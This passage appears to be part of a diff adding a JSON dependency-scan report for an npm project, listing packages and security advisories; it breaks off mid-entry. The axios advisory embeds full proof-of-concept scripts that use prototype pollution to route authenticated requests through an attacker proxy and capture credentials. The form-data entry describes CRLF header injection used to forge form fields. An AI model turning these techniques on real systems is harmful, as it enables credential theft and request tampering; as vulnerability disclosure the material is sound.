+          "ID": "ms@2.1.3",
+          "Name": "ms",
+          "Identifier": {
+            "PURL": "pkg:npm/ms@2.1.3",
+            "UID": "a54e20dbecd02e63"
+          },
+          "Version": "2.1.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2937,
+              "EndLine": 2942
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "proxy-from-env@2.1.0",
+          "Name": "proxy-from-env",
+          "Identifier": {
+            "PURL": "pkg:npm/proxy-from-env@2.1.0",
+            "UID": "808ab7c5b2ac0881"
+          },
+          "Version": "2.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3112,
+              "EndLine": 3120
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react-is@19.2.6",
+          "Name": "react-is",
+          "Identifier": {
+            "PURL": "pkg:npm/react-is@19.2.6",
+            "UID": "961c7e188680d9c4"
+          },
+          "Version": "19.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3152,
+              "EndLine": 3158
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react-redux@9.2.0",
+          "Name": "react-redux",
+          "Identifier": {
+            "PURL": "pkg:npm/react-redux@9.2.0",
+            "UID": "57eda415ab9fb064"
+          },
+          "Version": "9.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/react@19.2.14",
+            "@types/use-sync-external-store@0.0.6",
+            "react@19.2.6",
+            "redux@5.0.1",
+            "use-sync-external-store@1.6.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3159,
+              "EndLine": 3181
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "redux@5.0.1",
+          "Name": "redux",
+          "Identifier": {
+            "PURL": "pkg:npm/redux@5.0.1",
+            "UID": "76ef1a4e97dab57f"
+          },
+          "Version": "5.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3212,
+              "EndLine": 3217
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "redux-thunk@3.1.0",
+          "Name": "redux-thunk",
+          "Identifier": {
+            "PURL": "pkg:npm/redux-thunk@3.1.0",
+            "UID": "4144326545bc39a9"
+          },
+          "Version": "3.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "redux@5.0.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3218,
+              "EndLine": 3226
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "reselect@5.1.1",
+          "Name": "reselect",
+          "Identifier": {
+            "PURL": "pkg:npm/reselect@5.1.1",
+            "UID": "db8219e564bf5513"
+          },
+          "Version": "5.1.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3227,
+              "EndLine": 3232
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "scheduler@0.27.0",
+          "Name": "scheduler",
+          "Identifier": {
+            "PURL": "pkg:npm/scheduler@0.27.0",
+            "UID": "5d9ab0b3628c084c"
+          },
+          "Version": "0.27.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3274,
+              "EndLine": 3279
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "socket.io-parser@4.2.6",
+          "Name": "socket.io-parser",
+          "Identifier": {
+            "PURL": "pkg:npm/socket.io-parser@4.2.6",
+            "UID": "65e79c76115464e9"
+          },
+          "Version": "4.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@socket.io/component-emitter@3.1.2",
+            "debug@4.4.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3328,
+              "EndLine": 3340
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "tiny-invariant@1.3.3",
+          "Name": "tiny-invariant",
+          "Identifier": {
+            "PURL": "pkg:npm/tiny-invariant@1.3.3",
+            "UID": "b71c184ae3cdb577"
+          },
+          "Version": "1.3.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3382,
+              "EndLine": 3387
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "tslib@2.8.1",
+          "Name": "tslib",
+          "Identifier": {
+            "PURL": "pkg:npm/tslib@2.8.1",
+            "UID": "e32b70dc5f794614"
+          },
+          "Version": "2.8.1",
+          "Licenses": [
+            "0BSD"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3405,
+              "EndLine": 3410
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "use-sync-external-store@1.6.0",
+          "Name": "use-sync-external-store",
+          "Identifier": {
+            "PURL": "pkg:npm/use-sync-external-store@1.6.0",
+            "UID": "ffab41a967f2be09"
+          },
+          "Version": "1.6.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "react@19.2.6"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3465,
+              "EndLine": 3473
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "victory-vendor@37.3.6",
+          "Name": "victory-vendor",
+          "Identifier": {
+            "PURL": "pkg:npm/victory-vendor@37.3.6",
+            "UID": "d6c8a63d32d4c889"
+          },
+          "Version": "37.3.6",
+          "Licenses": [
+            "MIT AND ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/d3-array@3.2.2",
+            "@types/d3-ease@3.0.2",
+            "@types/d3-interpolate@3.0.4",
+            "@types/d3-scale@4.0.9",
+            "@types/d3-shape@3.1.8",
+            "@types/d3-time@3.0.4",
+            "@types/d3-timer@3.0.2",
+            "d3-array@3.2.4",
+            "d3-ease@3.0.1",
+            "d3-interpolate@3.0.1",
+            "d3-scale@4.0.2",
+            "d3-shape@3.2.0",
+            "d3-time@3.1.0",
+            "d3-timer@3.0.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3474,
+              "EndLine": 3495
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "ws@8.20.1",
+          "Name": "ws",
+          "Identifier": {
+            "PURL": "pkg:npm/ws@8.20.1",
+            "UID": "f1a0932dcbe0a67c"
+          },
+          "Version": "8.20.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3600,
+              "EndLine": 3620
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "xmlhttprequest-ssl@2.1.2",
+          "Name": "xmlhttprequest-ssl",
+          "Identifier": {
+            "PURL": "pkg:npm/xmlhttprequest-ssl@2.1.2",
+            "UID": "e37bd898284f3a00"
+          },
+          "Version": "2.1.2",
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3621,
+              "EndLine": 3628
+            }
+          ],
+          "AnalyzedBy": "npm"
+        }
+      ],
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "GHSA-gcfj-64vw-6mp9",
+          "PkgID": "axios@1.16.0",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.16.0",
+            "UID": "f00dc2b01085d010"
+          },
+          "InstalledVersion": "1.16.0",
+          "FixedVersion": "0.33.0, 1.18.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-gcfj-64vw-6mp9",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:a5e0cadf5fcfbc2bc8ae9d40a1f957af42549bd0ca971b4ad376a1380e86e125",
+          "Title": "Axios Node HTTP adapter can use an inherited proxy after interceptor config cloning",
+          "Description": "## Summary\n\nAxios’ Node.js HTTP adapter can route requests through an attacker-controlled proxy when `Object.prototype.proxy` is polluted and request configuration is materialized as a regular object before dispatch.\n\nRecent axios releases harden merged request config by creating a null-prototype object. However, request interceptors run after that merge and may return a replacement config. A common immutable interceptor pattern such as `{...config}` or `Object.assign({}, config)` converts the hardened config back into a normal object. Axios then dispatches that object without re-hardening it, and the Node HTTP adapter reads `config.proxy` through the prototype chain.\n\n## Impact\n\nIn a Node.js deployment using the HTTP adapter, an attacker who can trigger prototype pollution elsewhere in the process can route affected HTTP requests through an attacker-controlled proxy.\n\nThe highest confirmed impact is for plaintext HTTP requests. The proxy can observe explicit `Authorization` headers, axios-generated Basic auth from `config.auth`, request method, absolute URL, `Host`, and request body content. The proxy can also return its own response to axios for the affected request.\n\nThis does not establish browser impact. It also does not establish HTTPS header or body disclosure under normal TLS validation.\n\n## Affected Functionality\n\nAffected functionality is limited to axios requests that use the Node.js HTTP adapter, including default Node usage when the HTTP adapter is selected and explicit `adapter: 'http'` usage.\n\nThe relevant configuration path is `config.proxy` in the Node HTTP adapter. The hardened-bypass path requires a request interceptor such as:\n\n```js\napi.interceptors.request.use((config) =\u003e ({\n  ...config,\n  headers: {\n    ...config.headers,\n    'X-App': 'demo'\n  }\n}));\n```\n\nUnaffected or mitigating conditions include browser adapters, the Node fetch adapter, no polluted `Object.prototype.proxy`, an own `proxy: false` or safe own `proxy` value on the config, and hardened releases where interceptors return the original null-prototype config instead of a regular object clone.\n\n## Technical Details\n\n`lib/core/mergeConfig.js` creates a null-prototype merged config and uses own-property reads for merged values. This is intended to prevent polluted `Object.prototype` values from affecting config behavior.\n\n`lib/core/Axios.js` runs request interceptors after the merge. In both the asynchronous and synchronous interceptor paths, axios passes the interceptor-returned config into dispatch.\n\n`lib/core/dispatchRequest.js` accepts that returned config, transforms request data, selects the adapter, and calls the adapter without re-hardening or re-normalizing the config.\n\n`lib/adapters/http.js` uses own-property reads for several sensitive fields, but the initial proxy dispatch path still passes `config.proxy` directly into `setProxy()`. If an interceptor returned a regular object, `config.proxy` can resolve to inherited `Object.prototype.proxy`.\n\n## Proof of Concept of Attack\n\n```js\nimport axios from './index.js';\nimport http from 'node:http';\n\nfor (const key of [\n  'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY',\n  'http_proxy', 'https_proxy', 'all_proxy',\n  'NO_PROXY', 'no_proxy'\n]) {\n  delete process.env[key];\n}\n\nconst listen = (handler) =\u003e new Promise((resolve, reject) =\u003e {\n  const server = http.createServer(handler);\n  server.once('error', reject);\n  server.listen(0, '127.0.0.1', () =\u003e resolve(server));\n});\n\nconst close = (server) =\u003e new Promise((resolve) =\u003e server.close(resolve));\n\nconst targetHits = [];\nconst proxyHits = [];\n\nconst target = await listen((req, res) =\u003e {\n  targetHits.push(req.url);\n  res.end('target');\n});\n\nconst proxy = await listen((req, res) =\u003e {\n  let body = '';\n  req.on('data', (chunk) =\u003e body += chunk);\n  req.on('end', () =\u003e {\n    proxyHits.push({\n      url: req.url,\n      authorization: req.headers.authorization,\n      host: req.headers.host,\n      body\n    });\n    res.setHeader('content-type', 'application/json');\n    res.end('{\"server\":\"proxy\"}');\n  });\n});\n\nObject.prototype.proxy = {\n  protocol: 'http',\n  host: '127.0.0.1',\n  port: proxy.address().port\n};\n\nconst api = axios.create();\n\napi.interceptors.request.use((config) =\u003e ({\n  ...config,\n  headers: {\n    ...config.headers,\n    'X-App': 'demo'\n  }\n}));\n\ntry {\n  const url = `http://127.0.0.1:${target.address().port}/api/secret`;\n\n  const res = await api.post(\n    url,\n    {secret: 'request-body-secret'},\n    {headers: {Authorization: 'Bearer EXPLICIT_SECRET'}}\n  );\n\n  console.log({\n    response: res.data,\n    targetHits,\n    proxyHits,\n    finalConfigHasOwnProxy: Object.hasOwn(res.config, 'proxy')\n  });\n} finally {\n  delete Object.prototype.proxy;\n  await close(target);\n  await close(proxy);\n}\n```\n\nExpected vulnerable result: the response comes from the proxy, `targetHits` is empty, and `proxyHits` contains the absolute URL, authorization header, host header, and request body.\n\n## Workarounds\n\nSet an own `proxy: false` on affected requests or on an axios instance when proxy support is not required.\n\nAvoid request interceptors that return regular object clones of config in hardened releases. Returning the original config or cloning into a null-prototype object avoids this specific bypass, but this is fragile and should not replace a fix.\n\nUse the Node fetch adapter for affected requests where its behavior is compatible with the application.\n\n\u003cdetails\u003e\n\u003csummary\u003eOriginal Report\u003c/summary\u003e\n\n## Summary\n\n  Axios hardens merged request config by creating a null-prototype object, preventing polluted Object.prototype properties from influencing request behavior. Request interceptors run after that hardening, and a normal immutable\n  interceptor pattern such as {...config} or Object.assign({}, config) re-materializes the config as a regular object. Axios then dispatches that interceptor-returned object without re-hardening it. In the Node HTTP adapter, config.proxy\n  is read through the prototype chain, allowing a polluted Object.prototype.proxy to route authenticated HTTP requests through an attacker-controlled proxy.\n\n  ## Impact\n\n  In a Node.js deployment using the HTTP adapter, an attacker who can trigger prototype pollution elsewhere in the process can cause affected axios requests to be sent through an attacker-controlled proxy when the application uses a\n  request interceptor that returns a plain object copy of the config.\n\n  Verified local impact:\n\n  - Authenticated request redirection to attacker-controlled proxy.\n  - Disclosure of explicit Authorization headers.\n  - Disclosure of axios-generated Basic auth headers from config.auth.\n  - Disclosure of request metadata: method, absolute URL, Host header.\n  - Disclosure of POST body content.\n\n  This report does not claim browser impact or proven HTTPS credential disclosure. The demonstrated credential and body disclosure is for Node HTTP-adapter requests over HTTP/plaintext.\n\n  ## Affected component\n\n  The affected component is the Node.js HTTP adapter request path after request interceptors have run.\n\n  The issue requires:\n\n  - Node.js HTTP adapter usage.\n  - A polluted Object.prototype.proxy.\n  - A request interceptor that returns a plain object copy of the config.\n  - No own proxy: false or safe own proxy property on the request config.\n\n  ## Affected versions\n\n  Confirmed affected for this specific hardening-bypass variant:\n\n  - axios@1.15.2\n  - axios@1.16.0\n\n  axios@1.16.0 was the latest published version observed via npm view axios version during validation.\n\n  Related older behavior observed during testing:\n\n  - 1.13.0, 1.13.6, 1.14.0, 1.15.0, and 1.15.1 routed via inherited Object.prototype.proxy even without the interceptor re-materialization step. That is related background, not the narrowed hardening-bypass variant described here.\n\n  ## Root cause\n\n  1. Initial hardening\n\n     Axios initially hardens merged request config by creating a null-prototype object in mergeConfig(), which is meant to prevent inherited Object.prototype properties from influencing request behavior.\n     Permalink: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/mergeConfig.js#L21-L25\n  2. Interceptor re-materialization\n\n     Request interceptors run after that hardening step, and axios allows an interceptor to return a replacement config object. A common immutable pattern such as {...config} or Object.assign({}, config) converts the hardened null-\n     prototype config back into a normal object with Object.prototype as its prototype.\n     Permalinks: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L187-L199, https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L204-L218\n  3. No post-interceptor re-hardening\n\n     Axios passes the interceptor-returned config into request dispatch without restoring the null-prototype property or otherwise normalizing the object into an own-property-only structure.\n     Permalink: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/dispatchRequest.js#L34-L48\n  4. Prototype-chain read of proxy in the Node adapter\n\n     The Node HTTP adapter later consults config.proxy, and this read is reachable through the prototype chain once the interceptor has re-materialized the config as a normal object. As a result, a polluted Object.prototype.proxy can\n     redirect the outgoing authenticated request through an attacker-controlled proxy.\n     Permalink: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/adapters/http.js#L816-L820\n\n  ## Why this is a security issue and not intended behavior\n\n  Axios’ threat model explicitly treats polluted Object.prototype config reads as high-impact read-side gadgets and states that axios defends reachable config-read gadgets through own-property checks and null-prototype structures. The\n  existing regression tests also assert that a polluted Object.prototype.proxy must not route requests through an attacker proxy.\n\n  This behavior is therefore a bypass of axios’ existing prototype-pollution hardening, not merely a generic “polluted process” complaint. The interceptor does not need to be malicious; it can be ordinary application code that returns an\n  immutable copy of the config. The attacker-controlled piece is the polluted prototype property supplied by a separate vulnerability or dependency.\n\n  ## Realistic threat model\n\n  A realistic exploit chain is:\n\n  1. A transitive dependency or upstream parser bug allows prototype pollution in a Node.js process.\n  2. The polluted property is Object.prototype.proxy, with host and port pointing to an attacker-controlled proxy.\n  3. The application uses axios with a request interceptor that returns a plain object copy, such as adding headers immutably.\n  4. The application sends an HTTP request with credentials or sensitive body data.\n  5. Axios routes that request through the inherited proxy configuration.\n\n  This requires a prototype pollution primitive and a compatible interceptor pattern. It does not require the attacker to control the interceptor.\n\n  ## Proof of concept\n\n  Save as poc.mjs in the axios repository root:\n\n```js\n  import axios from './index.js';\n  import http from 'node:http';\n\n  const proxyEnvKeys = [\n    'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY',\n    'http_proxy', 'https_proxy', 'all_proxy',\n    'NO_PROXY', 'no_proxy'\n  ];\n\n  for (const key of proxyEnvKeys) delete process.env[key];\n\n  const listen = (handler) =\u003e new Promise((resolve, reject) =\u003e {\n    const server = http.createServer(handler);\n    server.once('error', reject);\n    server.listen(0, '127.0.0.1', () =\u003e resolve(server));\n  });\n\n  const close = (server) =\u003e new Promise((resolve) =\u003e server.close(resolve));\n\n  const targetHits = [];\n  const proxyHits = [];\n\n  const target = await listen((req, res) =\u003e {\n    let body = '';\n    req.on('data', (chunk) =\u003e body += chunk);\n    req.on('end', () =\u003e {\n      targetHits.push({\n        url: req.url,\n        method: req.method,\n        authorization: req.headers.authorization || null,\n        body\n      });\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(JSON.stringify({server: 'target'}));\n    });\n  });\n\n  const proxy = await listen((req, res) =\u003e {\n    let body = '';\n    req.on('data', (chunk) =\u003e body += chunk);\n    req.on('end', () =\u003e {\n      proxyHits.push({\n        url: req.url,\n        method: req.method,\n        authorization: req.headers.authorization || null,\n        host: req.headers.host || null,\n        body\n      });\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(JSON.stringify({server: 'proxy'}));\n    });\n  });\n\n  Object.prototype.proxy = {\n    protocol: 'http',\n    host: '127.0.0.1',\n    port: proxy.address().port\n  };\n\n  const api = axios.create();\n\n  api.interceptors.request.use((config) =\u003e ({\n    ...config,\n    headers: {\n      ...config.headers,\n      'X-App': 'demo'\n    }\n  }));\n\n  try {\n    const url = `http://127.0.0.1:${target.address().port}/api/secret`;\n\n    const explicit = await api.get(url, {\n      headers: {Authorization: 'Bearer EXPLICIT_SECRET'}\n    });\n\n    proxyHits.length = 0;\n    targetHits.length = 0;\n\n    const basic = await api.get(url, {\n      auth: {username: 'svc-account', password: 'prod-secret'}\n    });\n\n    proxyHits.length = 0;\n    targetHits.length = 0;\n\n    const post = await api.post(url, {secret: 'request-body-secret'}, {\n      headers: {Authorization: 'Bearer EXPLICIT_SECRET'}\n    });\n\n    console.log(JSON.stringify({\n      explicitResponse: explicit.data,\n      basicResponse: basic.data,\n      postResponse: post.data,\n      targetHits,\n      proxyHits,\n      finalConfigPrototype:\n        Object.getPrototypeOf(post.config) === Object.prototype\n          ? 'Object.prototype'\n          : 'other',\n      finalConfigHasOwnProxy:\n        Object.prototype.hasOwnProperty.call(post.config, 'proxy')\n    }, null, 2));\n  } finally {\n    delete Object.prototype.proxy;\n    await close(target);\n    await close(proxy);\n  }\n```\n\n  Run:\n```bash\n  npm ci\n  node poc.mjs\n```\n\n  ## Observed results\n\n  Representative observed output from local loopback testing:\n\n```text\n\n  {\n    \"explicitResponse\": {\"server\": \"proxy\"},\n    \"basicResponse\": {\"server\": \"proxy\"},\n    \"postResponse\": {\"server\": \"proxy\"},\n    \"targetHits\": [],\n    \"proxyHits\": [\n      {\n        \"url\": \"http://127.0.0.1:40613/api/secret\",\n        \"method\": \"POST\",\n        \"authorization\": \"Bearer EXPLICIT_SECRET\",\n        \"host\": \"127.0.0.1:40613\",\n        \"body\": \"{\\\"secret\\\":\\\"request-body-secret\\\"}\"\n      }\n    ],\n    \"finalConfigPrototype\": \"Object.prototype\",\n    \"finalConfigHasOwnProxy\": false\n  }\n\n  Additional validation showed axios-generated Basic auth is also disclosed to the proxy:\n\n  {\n    \"authorization\": \"Basic c3ZjLWFjY291bnQ6cHJvZC1zZWNyZXQ=\"\n  }\n\n```\n\n  That value decodes to:\n\n  svc-account:prod-secret\n\n  Negative controls were also tested:\n\n  - No interceptor: target receives request, proxy receives none.\n  - Interceptor mutating and returning the same config object: proxy receives none.\n  - Own proxy: false: proxy receives none.\n  - Null-prototype clone interceptor: proxy receives none.\n  - Fetch adapter in Node with the same interceptor: proxy receives none.\n\n  ## Suggested remediation\n\n  Re-harden the final request config after all request interceptors and before adapter dispatch. This should cover both asynchronous and synchronous interceptor paths.\n\n  A practical fix would be to normalize the interceptor-returned object into a null-prototype, own-property-only config before calling dispatchRequest(), or at the start of dispatchRequest() itself. Security-sensitive adapter reads should\n  also consistently use own-property access helpers. In particular, the Node HTTP adapter should not read config.proxy through the prototype chain.\n\n  ## Minimal regression test\n\n  Add an end-to-end Node HTTP adapter test that:\n\n  1. Starts a target server and attacker proxy on 127.0.0.1.\n  2. Sets Object.prototype.proxy to the attacker proxy.\n  3. Adds a request interceptor returning {...config, headers: {...config.headers}}.\n  4. Sends a request with an Authorization header.\n  5. Asserts the target server receives the request.\n  6. Asserts the attacker proxy receives no request.\n  7. Asserts the final config no longer exposes inherited proxy.\n\n  A second assertion can cover config.auth to ensure axios-generated Basic auth is not sent to the attacker proxy.\n\n  ## References / permalinks\n\n  - mergeConfig() null-prototype hardening: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/mergeConfig.js#L21-L25\n  - Async interceptor dispatch path: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L187-L199\n  - Synchronous interceptor dispatch path: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L204-L218\n  - dispatchRequest() receives interceptor-returned config: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/dispatchRequest.js#L34-L48\n  - Node HTTP adapter config.proxy read: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/adapters/http.js#L816-L820\n  - Axios threat model for prototype-pollution read-side gadgets: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/THREATMODEL.md#L136-L144\n  - Existing proxy pollution regression test intent: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/tests/unit/prototypePollution.test.js#L1098-L1135\n\u003c/details\u003e",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 8.3
+            }
+          },
+          "References": [
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+            "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+            "https://github.com/axios/axios/pull/11000",
+            "https://github.com/axios/axios/pull/11001",
+            "https://github.com/axios/axios/releases/tag/v0.33.0",
+            "https://github.com/axios/axios/releases/tag/v1.18.0",
+            "https://github.com/axios/axios/security/advisories/GHSA-gcfj-64vw-6mp9"
+          ],
+          "PublishedDate": "2026-07-20T22:40:07Z",
+          "LastModifiedDate": "2026-07-20T22:40:07Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-12143",
+          "VendorIDs": [
+            "GHSA-hmw2-7cc7-3qxx"
+          ],
+          "PkgID": "form-data@4.0.5",
+          "PkgName": "form-data",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/form-data@4.0.5",
+            "UID": "f7ff1399f0141b20"
+          },
+          "InstalledVersion": "4.0.5",
+          "FixedVersion": "2.5.6, 3.0.5, 4.0.6",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-12143",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:bb776546ccd1e18df09d124cf3779359c516679e8bfe29a751c9a95cdc4fa585",
+          "Title": "form-data: form-data: Form field override via CRLF injection",
+          "Description": "form-data is a library for creating readable multipart/form-data streams. In versions through 4.0.5, the `field` argument to `FormData#append` and the `filename` option are concatenated verbatim into the `Content-Disposition` header without escaping carriage return (CR), line feed (LF), or double-quote (\") characters. An application that passes attacker-controlled data as a field name or filename (for example, an API gateway that turns JSON object keys into multipart field names) allows the attacker to terminate the header line and inject additional headers, or to smuggle entire additional multipart parts, into the request the application forwards to a backend. This can let the attacker add or override form fields (e.g. set `is_admin=true`) seen by the downstream parser. This is an instance of CWE-93 (CRLF injection). The fix escapes CR, LF, and `\"` as `%0D`, `%0A`, and `%22` in field names and filenames, matching the serialization browsers use per the WHATWG HTML multipart/form-data encoding algorithm. Exploitation requires the consuming application to use untrusted input as a field name or filename; applications that use only fixed/trusted field names are not affected. Fixed in 2.5.6, 3.0.5, and 4.0.6.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-93"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+              "V3Score": 7.5,
+              "V40Score": 8.7
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:34342",
+            "https://access.redhat.com/errata/RHSA-2026:36319",
+            "https://access.redhat.com/errata/RHSA-2026:36625",
+            "https://access.redhat.com/errata/RHSA-2026:36754",
+            "https://access.redhat.com/errata/RHSA-2026:40262",
+            "https://access.redhat.com/errata/RHSA-2026:41031",
+            "https://access.redhat.com/errata/RHSA-2026:41066",
+            "https://access.redhat.com/errata/RHSA-2026:41928",
+            "https://access.redhat.com/errata/RHSA-2026:41929",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
+            "https://access.redhat.com/errata/RHSA-2026:42146",
+            "https://access.redhat.com/errata/RHSA-2026:42796",
+            "https://access.redhat.com/errata/RHSA-2026:43052",
+            "https://access.redhat.com/errata/RHSA-2026:44263",
+            "https://access.redhat.com/errata/RHSA-2026:44267",
+            "https://access.redhat.com/errata/RHSA-2026:48124",
+            "https://access.redhat.com/errata/RHSA-2026:48151",
+            "https://access.redhat.com/security/cve/CVE-2026-12143",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2488480",
+            "https://cwe.mitre.org/data/definitions/93.html",
+            "https://github.com/form-data/form-data",
+            "https://github.com/form-data/form-data/commit/64190db548c0179e37206858e39f27cf513e9435",
+            "https://github.com/form-data/form-data/commit/be3f3cf553978bac15a5182f1f3c3d2d38ccf229",
+            "https://github.com/form-data/form-data/commit/c7133499c2ee1b80c678e411244f4442bf902045",
+            "https://github.com/form-data/form-data/security/advisories/GHSA-hmw2-7cc7-3qxx",
+            "https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#multipart-form-data",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-12143",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-12143.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-12143",
+            "https://www.npmjs.com/package/form-data"
+          ],
+          "PublishedDate": "2026-06-12T19:16:26.56Z",
+          "LastModifiedDate": "2026-07-31T13:17:18.823Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-48779",
+          "VendorIDs": [
+            "GHSA-96hv-2xvq-fx4p"
+          ],
+          "PkgID": "ws@8.20.1",
+          "PkgName": "ws",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/ws@8.20.1",
+            "UID": "f1a0932dcbe0a67c"
+          },
+          "InstalledVersion": "8.20.1",
+          "FixedVersion": "5.2.5, 6.2.4, 7.5.11, 8.21.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-48779",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
